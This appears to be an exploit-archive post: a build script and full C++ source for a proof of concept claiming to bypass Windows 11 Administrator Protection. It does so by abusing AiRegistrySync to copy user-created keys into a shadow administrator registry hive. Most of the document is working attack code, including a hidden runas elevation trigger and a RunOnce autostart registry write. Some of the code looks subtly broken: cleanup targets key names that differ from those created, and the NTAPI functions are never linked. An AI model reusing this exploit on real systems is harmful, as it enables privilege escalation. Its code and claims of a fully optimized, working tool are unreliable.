@@ -1,0 +1,700 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows 11 build 10.0.27898.1000 Advanced Admin Protection Bypass via NTAPI Registry Manipulation                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212253/
+
+[+] Summary : This enhanced Proof‑of‑Concept demonstrates an advanced method for bypassing Windows Administrator Protection by manipulating registry hives using both WinAPI and NTAPI.
+              The code implements safe smart‑pointer wrappers for handles, secure SID management, deep registry enumeration, privilege checks, 
+			  shadow administrator SID detection, recursive key deletion, and controlled key creation under HKEY_USERS.
+              It also attempts to trigger Windows’ internal AiRegistrySync mechanism to replicate changes across user hives.
+             The PoC is fully optimized, uses modern C++ RAII patterns, and provides detailed diagnostic output for all operations, 
+			 making it suitable for research, auditing, and security analysis on Windows 10 and later.
+
+[+] POC : 
+
+build_enhanced.bat):
+
+@echo off
+echo Building AdminProtectionBypass Enhanced PoC...
+
+:: استخدام Visual Studio 2022 Compiler
+call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
+
+:: البناء
+cl.exe AdminProtectionBypass_Enhanced.cpp ^
+    /O2 ^
+    /EHsc ^
+    /std:c++17 ^
+    /Fe:AdminProtectionBypass_Enhanced.exe ^
+    /D _WIN32_WINNT=0x0A00 ^
+    /D _CRT_SECURE_NO_WARNINGS ^
+    /link ^
+    advapi32.lib ^
+    rpcrt4.lib ^
+    shell32.lib ^
+    user32.lib ^
+    shlwapi.lib
+
+if %errorlevel% equ 0 (
+    echo.
+    echo [SUCCESS] Build completed: AdminProtectionBypass_Enhanced.exe
+    echo.
+    echo Usage: AdminProtectionBypass_Enhanced.exe
+    echo Note: Run as standard user for best results
+) else (
+    echo.
+    echo [ERROR] Build failed
+    pause
+)
+
+#define WIN32_LEAN_AND_MEAN
+#define _WIN32_WINNT 0x0A00  // Windows 10
+#include <windows.h>
+#include <stdio.h>
+#include <string>
+#include <vector>
+#include <sddl.h>
+#include <rpc.h>
+#include <aclapi.h>
+#include <shlwapi.h>
+#include <algorithm>
+#include <memory>
+
+#pragma comment(lib, "rpcrt4.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shlwapi.lib")
+
+// ==================== NTAPI Definitions ====================
+typedef struct _RTL_OSVERSIONINFOW {
+    ULONG dwOSVersionInfoSize;
+    ULONG dwMajorVersion;
+    ULONG dwMinorVersion;
+    ULONG dwBuildNumber;
+    ULONG dwPlatformId;
+    WCHAR szCSDVersion[128];
+} RTL_OSVERSIONINFOW, *PRTL_OSVERSIONINFOW;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+// تعريف الثوابت
+#define OBJ_CASE_INSENSITIVE 0x00000040L
+
+// تعريفات الدوال NTAPI
+extern "C" {
+    typedef LONG NTSTATUS;
+    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+    #define STATUS_SUCCESS 0x00000000
+    
+    NTSTATUS NTAPI NtDeleteKey(HANDLE KeyHandle);
+    NTSTATUS NTAPI NtClose(HANDLE Handle);
+    NTSTATUS NTAPI NtOpenKey(
+        PHANDLE KeyHandle,
+        ACCESS_MASK DesiredAccess,
+        POBJECT_ATTRIBUTES ObjectAttributes
+    );
+    VOID NTAPI RtlInitUnicodeString(
+        PUNICODE_STRING DestinationString,
+        PCWSTR SourceString
+    );
+    NTSTATUS NTAPI RtlGetVersion(
+        PRTL_OSVERSIONINFOW lpVersionInformation
+    );
+}
+
+// ==================== Smart Pointer Wrappers ====================
+class SmartHandle {
+public:
+    SmartHandle() : h(nullptr) {}
+    explicit SmartHandle(HANDLE handle) : h(handle) {}
+    
+    // Delete copy operations
+    SmartHandle(const SmartHandle&) = delete;
+    SmartHandle& operator=(const SmartHandle&) = delete;
+    
+    // Allow move operations
+    SmartHandle(SmartHandle&& other) noexcept : h(other.h) {
+        other.h = nullptr;
+    }
+    
+    SmartHandle& operator=(SmartHandle&& other) noexcept {
+        if (this != &other) {
+            if (h) NtClose(h);
+            h = other.h;
+            other.h = nullptr;
+        }
+        return *this;
+    }
+    
+    ~SmartHandle() {
+        if (h) NtClose(h);
+    }
+    
+    HANDLE get() const { return h; }
+    HANDLE* ptr() { return &h; }
+    operator HANDLE() const { return h; }
+    bool valid() const { return h != nullptr && h != INVALID_HANDLE_VALUE; }
+    
+    void reset(HANDLE handle = nullptr) {
+        if (h && h != handle) NtClose(h);
+        h = handle;
+    }
+
+private:
+    HANDLE h;
+};
+
+// Deleter for HKEY
+struct RegKeyDeleter {
+    void operator()(HKEY hKey) const {
+        if (hKey) RegCloseKey(hKey);
+    }
+};
+
+using SmartRegKey = std::unique_ptr<std::remove_pointer<HKEY>::type, RegKeyDeleter>;
+
+// Deleter for SID
+struct SidDeleter {
+    void operator()(PSID pSid) const {
+        if (pSid) FreeSid(pSid);
+    }
+};
+using SmartSid = std::unique_ptr<void, SidDeleter>;
+
+// ==================== Helper Functions ====================
+bool IsUserInAdministratorsGroup() {
+    BOOL bIsAdmin = FALSE;
+    PSID pAdminSid = nullptr;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    
+    if (AllocateAndInitializeSid(&NtAuthority, 2,
+        SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS,
+        0, 0, 0, 0, 0, 0, &pAdminSid)) {
+        
+        SmartSid adminSid(pAdminSid);
+        CheckTokenMembership(nullptr, adminSid.get(), &bIsAdmin);
+    }
+    
+    return bIsAdmin != FALSE;
+}
+
+std::wstring GetCurrentUserSid() {
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        wprintf(L"[!] Failed to open process token: %lu\n", GetLastError());
+        return L"";
+    }
+    
+    SmartHandle token(hToken);
+    
+    DWORD tokenInfoSize = 0;
+    GetTokenInformation(token.get(), TokenUser, nullptr, 0, &tokenInfoSize);
+    
+    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+        return L"";
+    }
+    
+    std::vector<BYTE> buffer(tokenInfoSize);
+    PTOKEN_USER pTokenUser = nullptr;
+    
+    if (GetTokenInformation(token.get(), TokenUser, buffer.data(), tokenInfoSize, &tokenInfoSize)) {
+        pTokenUser = reinterpret_cast<PTOKEN_USER>(buffer.data());
+    }
+    
+    LPWSTR sidString = nullptr;
+    std::wstring result;
+    
+    if (pTokenUser && ConvertSidToStringSidW(pTokenUser->User.Sid, &sidString)) {
+        result = sidString;
+        LocalFree(sidString);
+    }
+    
+    return result;
+}
+
+std::wstring FindShadowAdminSid() {
+    wprintf(L"[*] Searching for shadow administrator hive...\n");
+    
+    HKEY hUsers = nullptr;
+    if (RegOpenKeyExW(HKEY_USERS, nullptr, 0, KEY_READ, &hUsers) != ERROR_SUCCESS) {
+        return L"";
+    }
+    
+    SmartRegKey hUsersKey(hUsers);
+    std::wstring shadowSid;
+    wchar_t subkeyName[256];
+    DWORD index = 0;
+    
+    std::wstring currentSid = GetCurrentUserSid();
+    
+    while (RegEnumKeyW(hUsersKey.get(), index++, subkeyName, ARRAYSIZE(subkeyName)) == ERROR_SUCCESS) {
+        std::wstring sid = subkeyName;
+        
+        // تجاهل SID الحالي و SIDs النظامية
+        if (sid == currentSid || 
+            sid.find(L"S-1-5-18") == 0 ||  // SYSTEM
+            sid.find(L"S-1-5-19") == 0 ||  // LOCAL SERVICE
+            sid.find(L"S-1-5-20") == 0 ||  // NETWORK SERVICE
+            sid.find(L"_Classes") != std::wstring::npos) {
+            continue;
+        }
+        
+        // SID طبيعي
+        if (sid.find(L"S-1-5-21-") == 0) {
+            // فحص hive
+            std::wstring testPath = sid + L"\\Environment";
+            HKEY hTest = nullptr;
+            
+            if (RegOpenKeyExW(HKEY_USERS, testPath.c_str(), 0, KEY_READ, &hTest) == ERROR_SUCCESS) {
+                RegCloseKey(hTest);
+                
+                // محاولة الكتابة (يجب أن تكون ممنوعة)
+                if (RegOpenKeyExW(HKEY_USERS, testPath.c_str(), 0, KEY_WRITE, &hTest) != ERROR_SUCCESS) {
+                    shadowSid = sid;
+                    wprintf(L"[+] Found shadow admin candidate: %s\n", shadowSid.c_str());
+                    break;
+                }
+                RegCloseKey(hTest);
+            }
+        }
+    }
+    
+    return shadowSid;
+}
+
+bool CheckRegistryAccess(const std::wstring& keyPath, REGSAM desiredAccess) {
+    HKEY hKey = nullptr;
+    
+    LSTATUS status = RegOpenKeyExW(
+        HKEY_USERS,
+        keyPath.c_str(),
+        0,
+        desiredAccess,
+        &hKey
+    );
+    
+    SmartRegKey hKeyPtr(hKey);
+    
+    if (status == ERROR_SUCCESS) {
+        wprintf(L"[+] Access granted: 0x%08lX to %s\n", desiredAccess, keyPath.c_str());
+        
+        if (desiredAccess & KEY_SET_VALUE) {
+            const wchar_t* testValue = L"PoC_Test";
+            status = RegSetValueExW(hKeyPtr.get(), L"PoC_WriteTest", 0, REG_SZ,
+                reinterpret_cast<const BYTE*>(testValue), 
+                static_cast<DWORD>((wcslen(testValue) + 1) * sizeof(wchar_t)));
+            
+            if (status == ERROR_SUCCESS) {
+                wprintf(L"[+] Write access confirmed\n");
+                RegDeleteValueW(hKeyPtr.get(), L"PoC_WriteTest");
+                return true;
+            } else {
+                wprintf(L"[!] Write test failed: %lu\n", status);
+            }
+        }
+        return true;
+    }
+    
+    wprintf(L"[!] Access denied: 0x%08lX to %s (Error: %lu)\n", 
+           desiredAccess, keyPath.c_str(), status);
+    return false;
+}
+
+bool CreateKeyboardLayoutKey(const std::wstring& keyPath) {
+    HKEY hReg = nullptr;
+
+    LONG status = RegCreateKeyExW(
+        HKEY_USERS,
+        keyPath.c_str(),
+        0, nullptr,
+        REG_OPTION_NON_VOLATILE,
+        KEY_SET_VALUE | KEY_CREATE_SUB_KEY,
+        nullptr,
+        &hReg, nullptr
+    );
+
+    if (status != ERROR_SUCCESS) {
+        wprintf(L"[!] Failed to create key: %lu\n", status);
+        return false;
+    }
+
+    SmartRegKey hKey(hReg);
+    wprintf(L"[+] Created keyboard layout key: %s\n", keyPath.c_str());
+
+    // DWORD value
+    DWORD dwValue = 1;
+    if (RegSetValueExW(hKey.get(), L"PoC_DWORD", 0, REG_DWORD,
+        reinterpret_cast<const BYTE*>(&dwValue), sizeof(dwValue)) == ERROR_SUCCESS) {
+        wprintf(L"[+] DWORD value added\n");
+    } else {
+        wprintf(L"[!] Failed to add DWORD\n");
+    }
+
+    // String value
+    const wchar_t* sVal = L"PoC_String";
+    if (RegSetValueExW(hKey.get(), L"PoC_String", 0, REG_SZ,
+        reinterpret_cast<const BYTE*>(sVal), 
+        static_cast<DWORD>((wcslen(sVal) + 1) * sizeof(wchar_t))) == ERROR_SUCCESS) {
+        wprintf(L"[+] String value added\n");
+    } else {
+        wprintf(L"[!] Failed to add string\n");
+    }
+
+    return true;
+}
+
+bool DeleteRegistryKey(const std::wstring& keyPath) {
+    wprintf(L"[*] Deleting key: %s\n", keyPath.c_str());
+
+    std::wstring ntPath = L"\\Registry\\User\\" + keyPath;
+
+    UNICODE_STRING uKey;
+    RtlInitUnicodeString(&uKey, ntPath.c_str());
+
+    OBJECT_ATTRIBUTES attr;
+    InitializeObjectAttributes(&attr, &uKey, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
+
+    SmartHandle hKey;
+
+    NTSTATUS status = NtOpenKey(hKey.ptr(), DELETE, &attr);
+    if (!NT_SUCCESS(status)) {
+        // محاولة باستخدام WinAPI إذا فشل NTAPI
+        wprintf(L"[!] NtOpenKey failed: 0x%08X, trying RegDeleteKey...\n", status);
+        
+        if (RegDeleteKeyW(HKEY_USERS, keyPath.c_str()) == ERROR_SUCCESS) {
+            wprintf(L"[+] Key deleted via RegDeleteKey\n");
+            return true;
+        }
+        
+        wprintf(L"[!] RegDeleteKey also failed: %lu\n", GetLastError());
+        return false;
+    }
+
+    status = NtDeleteKey(hKey.get());
+    if (!NT_SUCCESS(status)) {
+        wprintf(L"[!] NtDeleteKey failed: 0x%08X\n", status);
+        return false;
+    }
+
+    wprintf(L"[+] Key deleted successfully via NTAPI\n");
+    return true;
+}
+
+bool DeleteRegistryKeyRecursive(const std::wstring& keyPath) {
+    wprintf(L"[*] Recursive delete: %s\n", keyPath.c_str());
+    
+    HKEY hKey = nullptr;
+    LSTATUS status = RegOpenKeyExW(
+        HKEY_USERS,
+        keyPath.c_str(),
+        0,
+        KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE,
+        &hKey
+    );
+    
+    if (status != ERROR_SUCCESS) {
+        return false; // المفتاح غير موجود
+    }
+    
+    SmartRegKey hKeyPtr(hKey);
+    
+    // جمع جميع المفاتيح الفرعية أولاً
+    std::vector<std::wstring> subkeys;
+    wchar_t subkeyName[256];
+    DWORD subkeyIndex = 0;
+    DWORD subkeyNameSize = ARRAYSIZE(subkeyName);
+    
+    while (RegEnumKeyExW(hKeyPtr.get(), subkeyIndex, subkeyName, &subkeyNameSize,
+                        nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
+        subkeys.push_back(subkeyName);
+        subkeyNameSize = ARRAYSIZE(subkeyName);
+        subkeyIndex++;
+    }
+    
+    hKeyPtr.reset(); // إغلاق المفتاح
+    
+    // حذف جميع المفاتيح الفرعية بشكل متكرر
+    for (const auto& subkey : subkeys) {
+        std::wstring fullPath = keyPath + L"\\" + subkey;
+        DeleteRegistryKeyRecursive(fullPath);
+    }
+    
+    // حذف المفتاح نفسه
+    return DeleteRegistryKey(keyPath);
+}
+
+bool TriggerAiRegistrySyncViaElevation() {
+    wprintf(L"[*] Attempting to trigger AiRegistrySync via elevation...\n");
+    
+    // طريقة 1: محاولة تشغيل أمر يحتاج امتيازات
+    SHELLEXECUTEINFOW sei = { sizeof(sei) };
+    sei.lpVerb = L"runas";
+    sei.lpFile = L"cmd.exe";
+    sei.lpParameters = L"/c timeout 1 > nul";
+    sei.nShow = SW_HIDE;
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+    
+    if (ShellExecuteExW(&sei)) {
+        wprintf(L"[+] Elevation attempt triggered\n");
+        
+        if (sei.hProcess) {
+            WaitForSingleObject(sei.hProcess, 3000);
+            CloseHandle(sei.hProcess);
+        }
+        return true;
+    }
+    
+    wprintf(L"[!] Direct elevation failed: %lu\n", GetLastError());
+    
+    // طريقة 2: محاولة تشغيل شيء من RunOnce
+    HKEY hRunOnce = nullptr;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
+                     L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                     0, KEY_WRITE, &hRunOnce) == ERROR_SUCCESS) {
+        
+        SmartRegKey hRunOnceKey(hRunOnce);
+        const wchar_t* testValue = L"cmd.exe /c echo Test";
+        
+        RegSetValueExW(hRunOnceKey.get(), L"TestSync", 0, REG_SZ,
+                      reinterpret_cast<const BYTE*>(testValue),
+                      static_cast<DWORD>((wcslen(testValue) + 1) * sizeof(wchar_t)));
+        
+        wprintf(L"[+] Added RunOnce entry (may trigger sync on next login)\n");
+        return true;
+    }
+    
+    return false;
+}
+
+void WaitForSyncWithProgress(DWORD milliseconds) {
+    wprintf(L"[*] Waiting %lu ms for AiRegistrySync...\n", milliseconds);
+    
+    DWORD interval = 1000; // التحقق كل ثانية
+    DWORD elapsed = 0;
+    
+    while (elapsed < milliseconds) {
+        DWORD waitTime = std::min(interval, milliseconds - elapsed);
+        Sleep(waitTime);
+        elapsed += waitTime;
+        
+        if (elapsed % 5000 == 0 && elapsed > 0) {
+            wprintf(L"[*] Still waiting... (%lu ms elapsed)\n", elapsed);
+        }
+    }
+}
+
+bool TestVulnerability(const std::wstring& userSid, const std::wstring& shadowSid) {
+    wprintf(L"\n[+] ============================================\n");
+    wprintf(L"[+] VULNERABILITY TEST PROCEDURE\n");
+    wprintf(L"[+] ============================================\n\n");
+    
+    // الخطوة 1: إنشاء مفتاح في hive المستخدم
+    wprintf(L"[*] Step 1: Creating test key in user hive\n");
+    std::wstring userKeyName = L"TestVulnKey_" + std::to_wstring(GetTickCount());
+    std::wstring userKeyPath = userSid + L"\\Keyboard Layout\\" + userKeyName;
+    
+    if (!CreateKeyboardLayoutKey(userKeyPath)) {
+        return false;
+    }
+    
+    // الخطوة 2: تفعيل AiRegistrySync
+    wprintf(L"\n[*] Step 2: Triggering AiRegistrySync\n");
+    TriggerAiRegistrySyncViaElevation();
+    
+    // الخطوة 3: الانتظار للنسخ
+    wprintf(L"\n[*] Step 3: Waiting for sync to complete\n");
+    WaitForSyncWithProgress(20000); // 20 ثانية
+    
+    // الخطوة 4: التحقق من النسخ
+    wprintf(L"\n[*] Step 4: Checking for key copy to shadow hive\n");
+    std::wstring shadowKeyPath = shadowSid + L"\\Keyboard Layout\\" + userKeyName;
+    
+    HKEY hShadowKey = nullptr;
+    LSTATUS status = RegOpenKeyExW(
+        HKEY_USERS,
+        shadowKeyPath.c_str(),
+        0,
+        KEY_READ,
+        &hShadowKey
+    );
+    
+    SmartRegKey hShadowKeyPtr(hShadowKey);
+    
+    if (status == ERROR_SUCCESS) {
+        wprintf(L"[+] SUCCESS: Key was copied to shadow hive!\n");
+        
+        // قراءة القيمة للتأكد
+        DWORD readValue = 0;
+        DWORD valueSize = sizeof(readValue);
+        if (RegQueryValueExW(hShadowKeyPtr.get(), L"PoC_DWORD", nullptr, nullptr,
+                            reinterpret_cast<BYTE*>(&readValue), &valueSize) == ERROR_SUCCESS) {
+            wprintf(L"[+] Copied value matches: %lu\n", readValue);
+            
+            // محاولة الكتابة (يجب أن تكون مسموحة إذا كانت الثغرة موجودة)
+            if (CheckRegistryAccess(shadowKeyPath, KEY_WRITE)) {
+                wprintf(L"[!] CRITICAL: Have WRITE access to copied key!\n");
+                wprintf(L"[!] This confirms the vulnerability!\n");
+                return true;
+            }
+        }
+        
+        return true;
+    } else {
+        wprintf(L"[!] Key not copied to shadow hive\n");
+        wprintf(L"[!] Possible reasons:\n");
+        wprintf(L"    1. AiRegistrySync not triggered\n");
+        wprintf(L"    2. Sync hasn't completed yet\n");
+        wprintf(L"    3. System may be patched\n");
+        wprintf(L"[*] Error: %lu\n", status);
+    }
+    
+    return false;
+}
+
+void PrintSystemInfo() {
+    RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
+    NTSTATUS status = RtlGetVersion(&osvi);
+    
+    if (NT_SUCCESS(status)) {
+        wprintf(L"[*] System Information:\n");
+        wprintf(L"    OS Version: %lu.%lu\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
+        wprintf(L"    Build: %lu\n", osvi.dwBuildNumber);
+        
+        if (osvi.dwBuildNumber >= 27898) {
+            wprintf(L"    [!] This build supports Administrator Protection\n");
+        } else {
+            wprintf(L"    [!] This build may not support Administrator Protection\n");
+        }
+    }
+    
+    if (IsUserInAdministratorsGroup()) {
+        wprintf(L"    Current user: Administrator group member\n");
+    } else {
+        wprintf(L"    Current user: Standard user (good for testing)\n");
+    }
+    
+    wprintf(L"\n");
+}
+
+void CleanupTestKeys(const std::wstring& userSid, const std::wstring& shadowSid) {
+    wprintf(L"\n[*] Cleaning up test keys...\n");
+    
+    // حذف جميع المفاتيح التي تبدأ بـ TestVulnKey_ أو PoC_Key
+    HKEY hUsers = nullptr;
+    if (RegOpenKeyExW(HKEY_USERS, nullptr, 0, KEY_READ, &hUsers) == ERROR_SUCCESS) {
+        SmartRegKey hUsersKey(hUsers);
+        
+        // فحص hive المستخدم
+        std::wstring userBasePath = userSid + L"\\Keyboard Layout";
+        DeleteRegistryKeyRecursive(userBasePath + L"\\TestVulnKey");
+        DeleteRegistryKeyRecursive(userBasePath + L"\\PoC_Key");
+        
+        // فحص hive الـ shadow admin
+        std::wstring shadowBasePath = shadowSid + L"\\Keyboard Layout";
+        DeleteRegistryKeyRecursive(shadowBasePath + L"\\TestVulnKey");
+        DeleteRegistryKeyRecursive(shadowBasePath + L"\\PoC_Key");
+    }
+    
+    wprintf(L"[+] Cleanup completed\n");
+}
+
+int main() {
+    wprintf(L"====================================================\n");
+    wprintf(L"  Windows Admin Protection Bypass PoC - Enhanced\n");
+    wprintf(L"  AiRegistrySync Symbolic Link EoP Vulnerability\n");
+    wprintf(L"  With Smart Pointer Implementation\n");
+    wprintf(L"====================================================\n\n");
+    
+    // عرض معلومات النظام
+    PrintSystemInfo();
+    
+    // التحقق من أننا لسنا مدير نظام
+    if (IsUserInAdministratorsGroup()) {
+        wprintf(L"[!] WARNING: User is in Administrators group\n");
+        wprintf(L"[!] For best results, run as standard user\n");
+        wprintf(L"[!] Continue anyway? (Y/N): ");
+        
+        int c = getchar();
+        if (c != 'Y' && c != 'y') {
+            return 0;
+        }
+        getchar(); // Consume newline
+    }
+    
+    // الحصول على SIDs
+    std::wstring userSid = GetCurrentUserSid();
+    if (userSid.empty()) {
+        wprintf(L"[!] Failed to get current user SID\n");
+        return 1;
+    }
+    wprintf(L"[+] Current user SID: %s\n\n", userSid.c_str());
+    
+    std::wstring shadowSid = FindShadowAdminSid();
+    if (shadowSid.empty()) {
+        wprintf(L"[!] Could not find shadow admin SID\n");
+        wprintf(L"[!] Possible reasons:\n");
+        wprintf(L"    1. Administrator Protection not enabled\n");
+        wprintf(L"    2. No administrator logged in recently\n");
+        wprintf(L"    3. Different Windows version\n");
+        return 1;
+    }
+    wprintf(L"[+] Shadow admin SID: %s\n\n", shadowSid.c_str());
+    
+    // التحقق من الوصول الحالي
+    wprintf(L"[*] Testing current access levels...\n");
+    std::wstring shadowEnv = shadowSid + L"\\Environment";
+    
+    wprintf(L"    Read access to Environment: ");
+    CheckRegistryAccess(shadowEnv, KEY_READ);
+    
+    wprintf(L"    Write access to Environment: ");
+    bool hasWriteAccess = CheckRegistryAccess(shadowEnv, KEY_WRITE);
+    
+    if (hasWriteAccess) {
+        wprintf(L"\n[!] WARNING: Already have write access to shadow admin hive!\n");
+        wprintf(L"[!] System is VULNERABLE to this attack!\n");
+    }
+    
+    // اختبار الثغرة
+    bool isVulnerable = TestVulnerability(userSid, shadowSid);
+    
+    wprintf(L"\n[+] ============================================\n");
+    if (isVulnerable) {
+        wprintf(L"[+] SYSTEM IS VULNERABLE!\n");
+        wprintf(L"[+] AiRegistrySync copies keys with user's permissions\n");
+        wprintf(L"[+] This allows elevation of privilege attacks\n");
+    } else {
+        wprintf(L"[+] Could not confirm vulnerability\n");
+        wprintf(L"[+] System may be patched or conditions not met\n");
+    }
+    wprintf(L"[+] ============================================\n\n");
+    
+    // التنظيف
+    CleanupTestKeys(userSid, shadowSid);
+    
+    wprintf(L"[*] PoC completed successfully\n");
+    wprintf(L"[*] Press Enter to exit...\n");
+    getchar();
+    
+    return 0;
+}
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
